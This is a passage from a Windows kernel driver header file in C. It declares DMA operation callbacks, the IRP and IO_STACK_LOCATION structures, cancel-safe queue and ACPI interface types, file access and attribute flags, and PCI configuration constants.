  IN PMDL Mdl,
  IN PVOID CurrentVa,
  IN ULONG Length,
  IN PDRIVER_LIST_CONTROL ExecutionRoutine,
  IN PVOID Context,
  IN BOOLEAN WriteToDevice);

typedef VOID
(NTAPI *PPUT_SCATTER_GATHER_LIST)(
  IN PDMA_ADAPTER DmaAdapter,
  IN PSCATTER_GATHER_LIST ScatterGather,
  IN BOOLEAN WriteToDevice);

typedef NTSTATUS
(NTAPI *PCALCULATE_SCATTER_GATHER_LIST_SIZE)(
  IN PDMA_ADAPTER DmaAdapter,
  IN PMDL Mdl OPTIONAL,
  IN PVOID CurrentVa,
  IN ULONG Length,
  OUT PULONG ScatterGatherListSize,
  OUT PULONG pNumberOfMapRegisters OPTIONAL);

typedef NTSTATUS
(NTAPI *PBUILD_SCATTER_GATHER_LIST)(
  IN PDMA_ADAPTER DmaAdapter,
  IN PDEVICE_OBJECT DeviceObject,
  IN PMDL Mdl,
  IN PVOID CurrentVa,
  IN ULONG Length,
  IN PDRIVER_LIST_CONTROL ExecutionRoutine,
  IN PVOID Context,
  IN BOOLEAN WriteToDevice,
  IN PVOID ScatterGatherBuffer,
  IN ULONG ScatterGatherLength);

typedef NTSTATUS
(NTAPI *PBUILD_MDL_FROM_SCATTER_GATHER_LIST)(
  IN PDMA_ADAPTER DmaAdapter,
  IN PSCATTER_GATHER_LIST ScatterGather,
  IN PMDL OriginalMdl,
  OUT PMDL *TargetMdl);

typedef struct _DMA_OPERATIONS {
  ULONG Size;
  PPUT_DMA_ADAPTER PutDmaAdapter;
  PALLOCATE_COMMON_BUFFER AllocateCommonBuffer;
  PFREE_COMMON_BUFFER FreeCommonBuffer;
  PALLOCATE_ADAPTER_CHANNEL AllocateAdapterChannel;
  PFLUSH_ADAPTER_BUFFERS FlushAdapterBuffers;
  PFREE_ADAPTER_CHANNEL FreeAdapterChannel;
  PFREE_MAP_REGISTERS FreeMapRegisters;
  PMAP_TRANSFER MapTransfer;
  PGET_DMA_ALIGNMENT GetDmaAlignment;
  PREAD_DMA_COUNTER ReadDmaCounter;
  PGET_SCATTER_GATHER_LIST GetScatterGatherList;
  PPUT_SCATTER_GATHER_LIST PutScatterGatherList;
  PCALCULATE_SCATTER_GATHER_LIST_SIZE CalculateScatterGatherList;
  PBUILD_SCATTER_GATHER_LIST BuildScatterGatherList;
  PBUILD_MDL_FROM_SCATTER_GATHER_LIST BuildMdlFromScatterGatherList;
} DMA_OPERATIONS, *PDMA_OPERATIONS;

typedef struct _IO_RESOURCE_DESCRIPTOR {
  UCHAR Option;
  UCHAR Type;
  UCHAR ShareDisposition;
  UCHAR Spare1;
  USHORT Flags;
  USHORT Spare2;
  union {
    struct {
      ULONG Length;
      ULONG Alignment;
      PHYSICAL_ADDRESS MinimumAddress;
      PHYSICAL_ADDRESS MaximumAddress;
    } Port;
    struct {
      ULONG Length;
      ULONG Alignment;
      PHYSICAL_ADDRESS MinimumAddress;
      PHYSICAL_ADDRESS MaximumAddress;
    } Memory;
    struct {
      ULONG MinimumVector;
      ULONG MaximumVector;
    } Interrupt;
    struct {
      ULONG MinimumChannel;
      ULONG MaximumChannel;
    } Dma;
    struct {
      ULONG Length;
      ULONG Alignment;
      PHYSICAL_ADDRESS MinimumAddress;
      PHYSICAL_ADDRESS MaximumAddress;
    } Generic;
    struct {
      ULONG Data[3];
    } DevicePrivate;
    struct {
      ULONG Length;
      ULONG MinBusNumber;
      ULONG MaxBusNumber;
      ULONG Reserved;
    } BusNumber;
    struct {
      ULONG Priority;
      ULONG Reserved1;
      ULONG Reserved2;
    } ConfigData;
  } u;
} IO_RESOURCE_DESCRIPTOR, *PIO_RESOURCE_DESCRIPTOR;

typedef struct _IO_RESOURCE_LIST {
  USHORT Version;
  USHORT Revision;
  ULONG Count;
  IO_RESOURCE_DESCRIPTOR Descriptors[1];
} IO_RESOURCE_LIST, *PIO_RESOURCE_LIST;

typedef struct _IO_RESOURCE_REQUIREMENTS_LIST {
  ULONG ListSize;
  INTERFACE_TYPE InterfaceType;
  ULONG BusNumber;
  ULONG SlotNumber;
  ULONG Reserved[3];
  ULONG AlternativeLists;
  IO_RESOURCE_LIST List[1];
} IO_RESOURCE_REQUIREMENTS_LIST, *PIO_RESOURCE_REQUIREMENTS_LIST;

typedef VOID
(NTAPI DRIVER_CANCEL)(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN struct _IRP *Irp);
typedef DRIVER_CANCEL *PDRIVER_CANCEL;

typedef struct _IRP {
  CSHORT Type;
  USHORT Size;
  struct _MDL *MdlAddress;
  ULONG Flags;
  union {
    struct _IRP *MasterIrp;
    volatile LONG IrpCount;
    PVOID SystemBuffer;
  } AssociatedIrp;
  LIST_ENTRY ThreadListEntry;
  IO_STATUS_BLOCK IoStatus;
  KPROCESSOR_MODE RequestorMode;
  BOOLEAN PendingReturned;
  CHAR StackCount;
  CHAR CurrentLocation;
  BOOLEAN Cancel;
  KIRQL CancelIrql;
  CCHAR ApcEnvironment;
  UCHAR AllocationFlags;
  PIO_STATUS_BLOCK UserIosb;
  PKEVENT UserEvent;
  union {
    struct {
      _ANONYMOUS_UNION union {
        PIO_APC_ROUTINE UserApcRoutine;
        PVOID IssuingProcess;
      } DUMMYUNIONNAME;
      PVOID UserApcContext;
    } AsynchronousParameters;
    LARGE_INTEGER AllocationSize;
  } Overlay;
  volatile PDRIVER_CANCEL CancelRoutine;
  PVOID UserBuffer;
  union {
    struct {
      _ANONYMOUS_UNION union {
        KDEVICE_QUEUE_ENTRY DeviceQueueEntry;
        _ANONYMOUS_STRUCT struct {
          PVOID DriverContext[4];
        } DUMMYSTRUCTNAME;
      } DUMMYUNIONNAME;
      PETHREAD Thread;
      PCHAR AuxiliaryBuffer;
      _ANONYMOUS_STRUCT struct {
        LIST_ENTRY ListEntry;
        _ANONYMOUS_UNION union {
          struct _IO_STACK_LOCATION *CurrentStackLocation;
          ULONG PacketType;
        } DUMMYUNIONNAME;
      } DUMMYSTRUCTNAME;
      struct _FILE_OBJECT *OriginalFileObject;
    } Overlay;
    KAPC Apc;
    PVOID CompletionKey;
  } Tail;
} IRP, *PIRP;

typedef enum _IO_PAGING_PRIORITY {
  IoPagingPriorityInvalid,
  IoPagingPriorityNormal,
  IoPagingPriorityHigh,
  IoPagingPriorityReserved1,
  IoPagingPriorityReserved2
} IO_PAGING_PRIORITY;

typedef NTSTATUS
(NTAPI IO_COMPLETION_ROUTINE)(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN struct _IRP *Irp,
  IN PVOID Context);
typedef IO_COMPLETION_ROUTINE *PIO_COMPLETION_ROUTINE;

typedef VOID
(NTAPI IO_DPC_ROUTINE)(
  IN struct _KDPC *Dpc,
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN struct _IRP *Irp,
  IN PVOID Context);
typedef IO_DPC_ROUTINE *PIO_DPC_ROUTINE;

typedef NTSTATUS
(NTAPI *PMM_DLL_INITIALIZE)(
  IN PUNICODE_STRING RegistryPath);

typedef NTSTATUS
(NTAPI *PMM_DLL_UNLOAD)(
  VOID);

typedef VOID
(NTAPI IO_TIMER_ROUTINE)(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN PVOID Context);
typedef IO_TIMER_ROUTINE *PIO_TIMER_ROUTINE;

typedef struct _IO_SECURITY_CONTEXT {
  PSECURITY_QUALITY_OF_SERVICE SecurityQos;
  PACCESS_STATE AccessState;
  ACCESS_MASK DesiredAccess;
  ULONG FullCreateOptions;
} IO_SECURITY_CONTEXT, *PIO_SECURITY_CONTEXT;

struct _IO_CSQ;

typedef struct _IO_CSQ_IRP_CONTEXT {
  ULONG Type;
  struct _IRP *Irp;
  struct _IO_CSQ *Csq;
} IO_CSQ_IRP_CONTEXT, *PIO_CSQ_IRP_CONTEXT;

typedef VOID
(NTAPI *PIO_CSQ_INSERT_IRP)(
  IN struct _IO_CSQ *Csq,
  IN PIRP Irp);

typedef NTSTATUS
(NTAPI IO_CSQ_INSERT_IRP_EX)(
  IN struct _IO_CSQ *Csq,
  IN PIRP Irp,
  IN PVOID InsertContext);
typedef IO_CSQ_INSERT_IRP_EX *PIO_CSQ_INSERT_IRP_EX;

typedef VOID
(NTAPI *PIO_CSQ_REMOVE_IRP)(
  IN struct _IO_CSQ *Csq,
  IN PIRP Irp);

typedef PIRP
(NTAPI *PIO_CSQ_PEEK_NEXT_IRP)(
  IN struct _IO_CSQ *Csq,
  IN PIRP Irp,
  IN PVOID PeekContext);

typedef VOID
(NTAPI *PIO_CSQ_ACQUIRE_LOCK)(
  IN struct _IO_CSQ *Csq,
  OUT PKIRQL Irql);

typedef VOID
(NTAPI *PIO_CSQ_RELEASE_LOCK)(
  IN struct _IO_CSQ *Csq,
  IN KIRQL Irql);

typedef VOID
(NTAPI *PIO_CSQ_COMPLETE_CANCELED_IRP)(
  IN struct _IO_CSQ *Csq,
  IN PIRP Irp);

typedef struct _IO_CSQ {
  ULONG Type;
  PIO_CSQ_INSERT_IRP CsqInsertIrp;
  PIO_CSQ_REMOVE_IRP CsqRemoveIrp;
  PIO_CSQ_PEEK_NEXT_IRP CsqPeekNextIrp;
  PIO_CSQ_ACQUIRE_LOCK CsqAcquireLock;
  PIO_CSQ_RELEASE_LOCK CsqReleaseLock;
  PIO_CSQ_COMPLETE_CANCELED_IRP CsqCompleteCanceledIrp;
  PVOID ReservePointer;
} IO_CSQ, *PIO_CSQ;

typedef enum _BUS_QUERY_ID_TYPE {
  BusQueryDeviceID,
  BusQueryHardwareIDs,
  BusQueryCompatibleIDs,
  BusQueryInstanceID,
  BusQueryDeviceSerialNumber,
  BusQueryContainerID
} BUS_QUERY_ID_TYPE, *PBUS_QUERY_ID_TYPE;

typedef enum _DEVICE_TEXT_TYPE {
  DeviceTextDescription,
  DeviceTextLocationInformation
} DEVICE_TEXT_TYPE, *PDEVICE_TEXT_TYPE;

typedef BOOLEAN
(NTAPI *PGPE_SERVICE_ROUTINE)(
  PVOID,
  PVOID);

typedef NTSTATUS
(NTAPI *PGPE_CONNECT_VECTOR)(
  PDEVICE_OBJECT,
  ULONG,
  KINTERRUPT_MODE,
  BOOLEAN,
  PGPE_SERVICE_ROUTINE,
  PVOID,
  PVOID);

typedef NTSTATUS
(NTAPI *PGPE_DISCONNECT_VECTOR)(
  PVOID);

typedef NTSTATUS
(NTAPI *PGPE_ENABLE_EVENT)(
  PDEVICE_OBJECT,
  PVOID);

typedef NTSTATUS
(NTAPI *PGPE_DISABLE_EVENT)(
  PDEVICE_OBJECT,
  PVOID);

typedef NTSTATUS
(NTAPI *PGPE_CLEAR_STATUS)(
  PDEVICE_OBJECT,
  PVOID);

typedef VOID
(NTAPI *PDEVICE_NOTIFY_CALLBACK)(
  PVOID,
  ULONG);

typedef NTSTATUS
(NTAPI *PREGISTER_FOR_DEVICE_NOTIFICATIONS)(
  PDEVICE_OBJECT,
  PDEVICE_NOTIFY_CALLBACK,
  PVOID);

typedef VOID
(NTAPI *PUNREGISTER_FOR_DEVICE_NOTIFICATIONS)(
  PDEVICE_OBJECT,
  PDEVICE_NOTIFY_CALLBACK);

typedef struct _ACPI_INTERFACE_STANDARD {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PGPE_CONNECT_VECTOR GpeConnectVector;
  PGPE_DISCONNECT_VECTOR GpeDisconnectVector;
  PGPE_ENABLE_EVENT GpeEnableEvent;
  PGPE_DISABLE_EVENT GpeDisableEvent;
  PGPE_CLEAR_STATUS GpeClearStatus;
  PREGISTER_FOR_DEVICE_NOTIFICATIONS RegisterForDeviceNotifications;
  PUNREGISTER_FOR_DEVICE_NOTIFICATIONS UnregisterForDeviceNotifications;
} ACPI_INTERFACE_STANDARD, *PACPI_INTERFACE_STANDARD;

typedef BOOLEAN
(NTAPI *PGPE_SERVICE_ROUTINE2)(
  PVOID ObjectContext,
  PVOID ServiceContext);

typedef NTSTATUS
(NTAPI *PGPE_CONNECT_VECTOR2)(
  PVOID Context,
  ULONG GpeNumber,
  KINTERRUPT_MODE Mode,
  BOOLEAN Shareable,
  PGPE_SERVICE_ROUTINE ServiceRoutine,
  PVOID ServiceContext,
  PVOID *ObjectContext);

typedef NTSTATUS
(NTAPI *PGPE_DISCONNECT_VECTOR2)(
  PVOID Context,
  PVOID ObjectContext);

typedef NTSTATUS
(NTAPI *PGPE_ENABLE_EVENT2)(
  PVOID Context,
  PVOID ObjectContext);

typedef NTSTATUS
(NTAPI *PGPE_DISABLE_EVENT2)(
  PVOID Context,
  PVOID ObjectContext);

typedef NTSTATUS
(NTAPI *PGPE_CLEAR_STATUS2)(
  PVOID Context,
  PVOID ObjectContext);

typedef VOID
(NTAPI *PDEVICE_NOTIFY_CALLBACK2)(
  PVOID NotificationContext,
  ULONG NotifyCode);

typedef NTSTATUS
(NTAPI *PREGISTER_FOR_DEVICE_NOTIFICATIONS2)(
  PVOID Context,
  PDEVICE_NOTIFY_CALLBACK2 NotificationHandler,
  PVOID NotificationContext);

typedef VOID
(NTAPI *PUNREGISTER_FOR_DEVICE_NOTIFICATIONS2)(
  PVOID Context);

typedef struct _ACPI_INTERFACE_STANDARD2 {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PGPE_CONNECT_VECTOR2 GpeConnectVector;
  PGPE_DISCONNECT_VECTOR2 GpeDisconnectVector;
  PGPE_ENABLE_EVENT2 GpeEnableEvent;
  PGPE_DISABLE_EVENT2 GpeDisableEvent;
  PGPE_CLEAR_STATUS2 GpeClearStatus;
  PREGISTER_FOR_DEVICE_NOTIFICATIONS2 RegisterForDeviceNotifications;
  PUNREGISTER_FOR_DEVICE_NOTIFICATIONS2 UnregisterForDeviceNotifications;
} ACPI_INTERFACE_STANDARD2, *PACPI_INTERFACE_STANDARD2;

#if !defined(_AMD64_) && !defined(_IA64_)
#include <pshpack4.h>
#endif
typedef struct _IO_STACK_LOCATION {
  UCHAR MajorFunction;
  UCHAR MinorFunction;
  UCHAR Flags;
  UCHAR Control;
  union {
    struct {
      PIO_SECURITY_CONTEXT SecurityContext;
      ULONG Options;
      USHORT POINTER_ALIGNMENT FileAttributes;
      USHORT ShareAccess;
      ULONG POINTER_ALIGNMENT EaLength;
    } Create;
    struct {
      PIO_SECURITY_CONTEXT SecurityContext;
      ULONG Options;
      USHORT POINTER_ALIGNMENT Reserved;
      USHORT ShareAccess;
      PNAMED_PIPE_CREATE_PARAMETERS Parameters;
    } CreatePipe;
    struct {
      PIO_SECURITY_CONTEXT SecurityContext;
      ULONG Options;
      USHORT POINTER_ALIGNMENT Reserved;
      USHORT ShareAccess;
      PMAILSLOT_CREATE_PARAMETERS Parameters;
    } CreateMailslot;
    struct {
      ULONG Length;
      ULONG POINTER_ALIGNMENT Key;
#ifdef _WIN64
      ULONG Flags;
#endif
      LARGE_INTEGER ByteOffset;
    } Read;
    struct {
      ULONG Length;
      ULONG POINTER_ALIGNMENT Key;
#ifdef _WIN64
      ULONG Flags;
#endif
      LARGE_INTEGER ByteOffset;
    } Write;
    struct {
      ULONG Length;
      PUNICODE_STRING FileName;
      FILE_INFORMATION_CLASS FileInformationClass;
      ULONG POINTER_ALIGNMENT FileIndex;
    } QueryDirectory;
    struct {
      ULONG Length;
      ULONG POINTER_ALIGNMENT CompletionFilter;
    } NotifyDirectory;
    struct {
      ULONG Length;
      ULONG POINTER_ALIGNMENT CompletionFilter;
      DIRECTORY_NOTIFY_INFORMATION_CLASS POINTER_ALIGNMENT DirectoryNotifyInformationClass;
    } NotifyDirectoryEx;
    struct {
      ULONG Length;
      FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass;
    } QueryFile;
    struct {
      ULONG Length;
      FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass;
      PFILE_OBJECT FileObject;
      _ANONYMOUS_UNION union {
        _ANONYMOUS_STRUCT struct {
          BOOLEAN ReplaceIfExists;
          BOOLEAN AdvanceOnly;
        } DUMMYSTRUCTNAME;
        ULONG ClusterCount;
        HANDLE DeleteHandle;
      } DUMMYUNIONNAME;
    } SetFile;
    struct {
      ULONG Length;
      PVOID EaList;
      ULONG EaListLength;
      ULONG POINTER_ALIGNMENT EaIndex;
    } QueryEa;
    struct {
      ULONG Length;
    } SetEa;
    struct {
      ULONG Length;
      FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass;
    } QueryVolume;
    struct {
      ULONG Length;
      FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass;
    } SetVolume;
    struct {
      ULONG OutputBufferLength;
      ULONG POINTER_ALIGNMENT InputBufferLength;
      ULONG POINTER_ALIGNMENT FsControlCode;
      PVOID Type3InputBuffer;
    } FileSystemControl;
    struct {
      PLARGE_INTEGER Length;
      ULONG POINTER_ALIGNMENT Key;
      LARGE_INTEGER ByteOffset;
    } LockControl;
    struct {
      ULONG OutputBufferLength;
      ULONG POINTER_ALIGNMENT InputBufferLength;
      ULONG POINTER_ALIGNMENT IoControlCode;
      PVOID Type3InputBuffer;
    } DeviceIoControl;
    struct {
      SECURITY_INFORMATION SecurityInformation;
      ULONG POINTER_ALIGNMENT Length;
    } QuerySecurity;
    struct {
      SECURITY_INFORMATION SecurityInformation;
      PSECURITY_DESCRIPTOR SecurityDescriptor;
    } SetSecurity;
    struct {
      PVPB Vpb;
      PDEVICE_OBJECT DeviceObject;
    } MountVolume;
    struct {
      PVPB Vpb;
      PDEVICE_OBJECT DeviceObject;
    } VerifyVolume;
    struct {
      struct _SCSI_REQUEST_BLOCK *Srb;
    } Scsi;
    struct {
      ULONG Length;
      PSID StartSid;
      struct _FILE_GET_QUOTA_INFORMATION *SidList;
      ULONG SidListLength;
    } QueryQuota;
    struct {
      ULONG Length;
    } SetQuota;
    struct {
      DEVICE_RELATION_TYPE Type;
    } QueryDeviceRelations;
    struct {
      CONST GUID *InterfaceType;
      USHORT Size;
      USHORT Version;
      PINTERFACE Interface;
      PVOID InterfaceSpecificData;
    } QueryInterface;
    struct {
      PDEVICE_CAPABILITIES Capabilities;
    } DeviceCapabilities;
    struct {
      PIO_RESOURCE_REQUIREMENTS_LIST IoResourceRequirementList;
    } FilterResourceRequirements;
    struct {
      ULONG WhichSpace;
      PVOID Buffer;
      ULONG Offset;
      ULONG POINTER_ALIGNMENT Length;
    } ReadWriteConfig;
    struct {
      BOOLEAN Lock;
    } SetLock;
    struct {
      BUS_QUERY_ID_TYPE IdType;
    } QueryId;
    struct {
      DEVICE_TEXT_TYPE DeviceTextType;
      LCID POINTER_ALIGNMENT LocaleId;
    } QueryDeviceText;
    struct {
      BOOLEAN InPath;
      BOOLEAN Reserved[3];
      DEVICE_USAGE_NOTIFICATION_TYPE POINTER_ALIGNMENT Type;
    } UsageNotification;
    struct {
      SYSTEM_POWER_STATE PowerState;
    } WaitWake;
    struct {
      PPOWER_SEQUENCE PowerSequence;
    } PowerSequence;
    struct {
#if (NTDDI_VERSION >= NTDDI_WINVISTA)
      _ANONYMOUS_UNION union {
#endif
        ULONG SystemContext;
#if (NTDDI_VERSION >= NTDDI_WINVISTA)
        SYSTEM_POWER_STATE_CONTEXT SystemPowerStateContext;
      } DUMMYUNIONNAME;
#endif
      POWER_STATE_TYPE POINTER_ALIGNMENT Type;
      POWER_STATE POINTER_ALIGNMENT State;
      POWER_ACTION POINTER_ALIGNMENT ShutdownType;
    } Power;
    struct {
      PCM_RESOURCE_LIST AllocatedResources;
      PCM_RESOURCE_LIST AllocatedResourcesTranslated;
    } StartDevice;
    struct {
      ULONG_PTR ProviderId;
      PVOID DataPath;
      ULONG BufferSize;
      PVOID Buffer;
    } WMI;
    struct {
      PVOID Argument1;
      PVOID Argument2;
      PVOID Argument3;
      PVOID Argument4;
    } Others;
  } Parameters;
  PDEVICE_OBJECT DeviceObject;
  PFILE_OBJECT FileObject;
  PIO_COMPLETION_ROUTINE CompletionRoutine;
  PVOID Context;
} IO_STACK_LOCATION, *PIO_STACK_LOCATION;
#if !defined(_AMD64_) && !defined(_IA64_)
#include <poppack.h>
#endif

/* IO_STACK_LOCATION.Control */

#define SL_PENDING_RETURNED               0x01
#define SL_ERROR_RETURNED                 0x02
#define SL_INVOKE_ON_CANCEL               0x20
#define SL_INVOKE_ON_SUCCESS              0x40
#define SL_INVOKE_ON_ERROR                0x80

#define METHOD_BUFFERED                   0
#define METHOD_IN_DIRECT                  1
#define METHOD_OUT_DIRECT                 2
#define METHOD_NEITHER                    3

#define METHOD_DIRECT_TO_HARDWARE       METHOD_IN_DIRECT
#define METHOD_DIRECT_FROM_HARDWARE     METHOD_OUT_DIRECT

#define FILE_SUPERSEDED                   0x00000000
#define FILE_OPENED                       0x00000001
#define FILE_CREATED                      0x00000002
#define FILE_OVERWRITTEN                  0x00000003
#define FILE_EXISTS                       0x00000004
#define FILE_DOES_NOT_EXIST               0x00000005

#define FILE_USE_FILE_POINTER_POSITION    0xfffffffe
#define FILE_WRITE_TO_END_OF_FILE         0xffffffff

/* also in winnt.h */
#define FILE_LIST_DIRECTORY               0x00000001
#define FILE_READ_DATA                    0x00000001
#define FILE_ADD_FILE                     0x00000002
#define FILE_WRITE_DATA                   0x00000002
#define FILE_ADD_SUBDIRECTORY             0x00000004
#define FILE_APPEND_DATA                  0x00000004
#define FILE_CREATE_PIPE_INSTANCE         0x00000004
#define FILE_READ_EA                      0x00000008
#define FILE_WRITE_EA                     0x00000010
#define FILE_EXECUTE                      0x00000020
#define FILE_TRAVERSE                     0x00000020
#define FILE_DELETE_CHILD                 0x00000040
#define FILE_READ_ATTRIBUTES              0x00000080
#define FILE_WRITE_ATTRIBUTES             0x00000100

#define FILE_SHARE_READ                   0x00000001
#define FILE_SHARE_WRITE                  0x00000002
#define FILE_SHARE_DELETE                 0x00000004
#define FILE_SHARE_VALID_FLAGS            0x00000007

#define FILE_ATTRIBUTE_READONLY           0x00000001
#define FILE_ATTRIBUTE_HIDDEN             0x00000002
#define FILE_ATTRIBUTE_SYSTEM             0x00000004
#define FILE_ATTRIBUTE_DIRECTORY          0x00000010
#define FILE_ATTRIBUTE_ARCHIVE            0x00000020
#define FILE_ATTRIBUTE_DEVICE             0x00000040
#define FILE_ATTRIBUTE_NORMAL             0x00000080
#define FILE_ATTRIBUTE_TEMPORARY          0x00000100
#define FILE_ATTRIBUTE_SPARSE_FILE        0x00000200
#define FILE_ATTRIBUTE_REPARSE_POINT      0x00000400
#define FILE_ATTRIBUTE_COMPRESSED         0x00000800
#define FILE_ATTRIBUTE_OFFLINE            0x00001000
#define FILE_ATTRIBUTE_NOT_CONTENT_INDEXED 0x00002000
#define FILE_ATTRIBUTE_ENCRYPTED          0x00004000
#define FILE_ATTRIBUTE_VIRTUAL            0x00010000

#define FILE_ATTRIBUTE_VALID_FLAGS        0x00007fb7
#define FILE_ATTRIBUTE_VALID_SET_FLAGS    0x000031a7

#define FILE_VALID_OPTION_FLAGS           0x00ffffff
#define FILE_VALID_PIPE_OPTION_FLAGS      0x00000032
#define FILE_VALID_MAILSLOT_OPTION_FLAGS  0x00000032
#define FILE_VALID_SET_FLAGS              0x00000036

#define FILE_SUPERSEDE                    0x00000000
#define FILE_OPEN                         0x00000001
#define FILE_CREATE                       0x00000002
#define FILE_OPEN_IF                      0x00000003
#define FILE_OVERWRITE                    0x00000004
#define FILE_OVERWRITE_IF                 0x00000005
#define FILE_MAXIMUM_DISPOSITION          0x00000005

#define FILE_DIRECTORY_FILE               0x00000001
#define FILE_WRITE_THROUGH                0x00000002
#define FILE_SEQUENTIAL_ONLY              0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING    0x00000008
#define FILE_SYNCHRONOUS_IO_ALERT         0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT      0x00000020
#define FILE_NON_DIRECTORY_FILE           0x00000040
#define FILE_CREATE_TREE_CONNECTION       0x00000080
#define FILE_COMPLETE_IF_OPLOCKED         0x00000100
#define FILE_NO_EA_KNOWLEDGE              0x00000200
#define FILE_OPEN_REMOTE_INSTANCE         0x00000400
#define FILE_RANDOM_ACCESS                0x00000800
#define FILE_DELETE_ON_CLOSE              0x00001000
#define FILE_OPEN_BY_FILE_ID              0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT       0x00004000
#define FILE_NO_COMPRESSION               0x00008000
#if (NTDDI_VERSION >= NTDDI_WIN7)
#define FILE_OPEN_REQUIRING_OPLOCK        0x00010000
#define FILE_DISALLOW_EXCLUSIVE           0x00020000
#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */
#define FILE_RESERVE_OPFILTER             0x00100000
#define FILE_OPEN_REPARSE_POINT           0x00200000
#define FILE_OPEN_NO_RECALL               0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY    0x00800000

#define FILE_ANY_ACCESS                   0x00000000
#define FILE_SPECIAL_ACCESS               FILE_ANY_ACCESS
#define FILE_READ_ACCESS                  0x00000001
#define FILE_WRITE_ACCESS                 0x00000002

#define FILE_ALL_ACCESS \
  (STANDARD_RIGHTS_REQUIRED | \
   SYNCHRONIZE | \
   0x1FF)

#define FILE_GENERIC_EXECUTE \
  (STANDARD_RIGHTS_EXECUTE | \
   FILE_READ_ATTRIBUTES | \
   FILE_EXECUTE | \
   SYNCHRONIZE)

#define FILE_GENERIC_READ \
  (STANDARD_RIGHTS_READ | \
   FILE_READ_DATA | \
   FILE_READ_ATTRIBUTES | \
   FILE_READ_EA | \
   SYNCHRONIZE)

#define FILE_GENERIC_WRITE \
  (STANDARD_RIGHTS_WRITE | \
   FILE_WRITE_DATA | \
   FILE_WRITE_ATTRIBUTES | \
   FILE_WRITE_EA | \
   FILE_APPEND_DATA | \
   SYNCHRONIZE)

/* end winnt.h */

#define WMIREG_ACTION_REGISTER      1
#define WMIREG_ACTION_DEREGISTER    2
#define WMIREG_ACTION_REREGISTER    3
#define WMIREG_ACTION_UPDATE_GUIDS  4
#define WMIREG_ACTION_BLOCK_IRPS    5

#define WMIREGISTER                 0
#define WMIUPDATE                   1

typedef VOID
(NTAPI FWMI_NOTIFICATION_CALLBACK)(
  PVOID Wnode,
  PVOID Context);
typedef FWMI_NOTIFICATION_CALLBACK *WMI_NOTIFICATION_CALLBACK;

#ifndef _PCI_X_
#define _PCI_X_

typedef struct _PCI_SLOT_NUMBER {
  union {
    struct {
      ULONG DeviceNumber:5;
      ULONG FunctionNumber:3;
      ULONG Reserved:24;
    } bits;
    ULONG AsULONG;
  } u;
} PCI_SLOT_NUMBER, *PPCI_SLOT_NUMBER;

#define PCI_TYPE0_ADDRESSES               6
#define PCI_TYPE1_ADDRESSES               2
#define PCI_TYPE2_ADDRESSES               5

typedef struct _PCI_COMMON_HEADER {
  PCI_COMMON_HEADER_LAYOUT
} PCI_COMMON_HEADER, *PPCI_COMMON_HEADER;

#ifdef __cplusplus
typedef struct _PCI_COMMON_CONFIG {
  PCI_COMMON_HEADER_LAYOUT
  UCHAR DeviceSpecific[192];
} PCI_COMMON_CONFIG, *PPCI_COMMON_CONFIG;
#else
typedef struct _PCI_COMMON_CONFIG {
  __extension__ struct {
    PCI_COMMON_HEADER_LAYOUT
  };
  UCHAR DeviceSpecific[192];
} PCI_COMMON_CONFIG, *PPCI_COMMON_CONFIG;
#endif

#define PCI_COMMON_HDR_LENGTH (FIELD_OFFSET(PCI_COMMON_CONFIG, DeviceSpecific))

#define PCI_EXTENDED_CONFIG_LENGTH               0x1000

#define PCI_MAX_DEVICES        32
#define PCI_MAX_FUNCTION       8
#define PCI_MAX_BRIDGE_NUMBER  0xFF
#define PCI_INVALID_VENDORID   0xFFFF

/* PCI_COMMON_CONFIG.HeaderType */
#define PCI_MULTIFUNCTION                 0x80
#define PCI_DEVICE_TYPE                   0x00
#define PCI_BRIDGE_TYPE                   0x01
#define PCI_CARDBUS_BRIDGE_TYPE           0x02

#define PCI_CONFIGURATION_TYPE(PciData) \
  (((PPCI_COMMON_CONFIG) (PciData))->HeaderType & ~PCI_MULTIFUNCTION)

#define PCI_MULTIFUNCTION_DEVICE(PciData) \
  ((((PPCI_COMMON_CONFIG) (PciData))->HeaderType & PCI_MULTIFUNCTION) != 0)

/* PCI_COMMON_CONFIG.Command */
#define PCI_ENABLE_IO_SPACE               0x0001
#define PCI_ENABLE_MEMORY_SPACE           0x0002
#define PCI_ENABLE_BUS_MASTER             0x0004
#define PCI_ENABLE_SPECIAL_CYCLES         0x0008
#define PCI_ENABLE_WRITE_AND_INVALIDATE   0x0010
#define PCI_ENABLE_VGA_COMPATIBLE_PALETTE 0x0020
#define PCI_ENABLE_PARITY                 0x0040
#define PCI_ENABLE_WAIT_CYCLE             0x0080
#define PCI_ENABLE_SERR                   0x0100
#define PCI_ENABLE_FAST_BACK_TO_BACK      0x0200
#define PCI_DISABLE_LEVEL_INTERRUPT       0x0400

/* PCI_COMMON_CONFIG.Status */
#define PCI_STATUS_INTERRUPT_PENDING      0x0008
#define PCI_STATUS_CAPABILITIES_LIST      0x0010
#define PCI_STATUS_66MHZ_CAPABLE          0x0020
#define PCI_STATUS_UDF_SUPPORTED          0x0040
#define PCI_STATUS_FAST_BACK_TO_BACK      0x0080
#define PCI_STATUS_DATA_PARITY_DETECTED   0x0100
#define PCI_STATUS_DEVSEL                 0x0600
#define PCI_STATUS_SIGNALED_TARGET_ABORT  0x0800
#define PCI_STATUS_RECEIVED_TARGET_ABORT  0x1000
#define PCI_STATUS_RECEIVED_MASTER_ABORT  0x2000
#define PCI_STATUS_SIGNALED_SYSTEM_ERROR  0x4000
#define PCI_STATUS_DETECTED_PARITY_ERROR  0x8000

/* IO_STACK_LOCATION.Parameters.ReadWriteControl.WhichSpace */

